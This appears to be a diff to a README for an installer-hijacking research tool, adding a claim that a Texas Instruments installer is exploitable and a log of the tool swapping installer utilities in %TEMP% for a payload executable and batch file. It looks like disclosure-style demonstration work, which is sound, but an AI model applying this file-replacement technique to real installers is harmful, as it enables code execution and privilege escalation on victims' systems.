@@ -189,6 +189,29 @@ Targeting a single directory (such as `%TEMP%`) at a time can increase the likel
 
 - Visual Studio code-signing checks on updates prevent exploitation, (lightly tested .VSIX)
 
+- Texas Instrument Code Composer Installer can be exploited for auth bypass 09/25/2025.
+
+```
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7z.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7za.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\7za.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\ccs_monitor.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\ccs_monitor.bat.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\ccs_update_20.3.0.00014.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\ccs_update_20.3.0.00014.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\certificates\install-certs.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\certificates\install-certs.bat.bak
+[2025-09-25 14:39:59] [SetupHijack] New infections this run: 1
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\curl.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\curl.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\signing\sign.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\signing\sign.bat.bak
+[2025-09-25 14:39:59] [SetupHijack] New infections this run: 1
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\wget\wget.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\wget\wget.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] New infections this run: 1
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\zip\unzip.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\zip\unzip.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\zip\zip.exe with payload c:\Users\Fantastic\Desktop\DEMO\Renge_x64.exe, backup: C:\Users\FANTAS~1\AppData\Local\Temp\ccs_fe3a9075-a8c1-44c2-69a2-0d76d423353e\util\zip\zip.exe.bak
+[2025-09-25 14:39:59] [SetupHijack] New infections this run: 2
+[2025-09-25 14:39:59] [SetupHijack] New infections this run: 5
+[2025-09-25 14:40:02] [SetupHijack] Total infections this session: 13
+[2025-09-25 14:40:29] [SetupHijack] Replaced C:\Users\FANTAS~1\AppData\Local\Temp\tmp1758829228.bat with payload install.bat, backup: C:\Users\FANTAS~1\AppData\Local\Temp\tmp1758829228.bat.bak
+[2025-09-25 14:40:29] [SetupHijack] New infections this run: 1
+```
+
 ---
 
 These files are available under an Attribution-NonCommercial-NoDerivatives 4.0 International license.
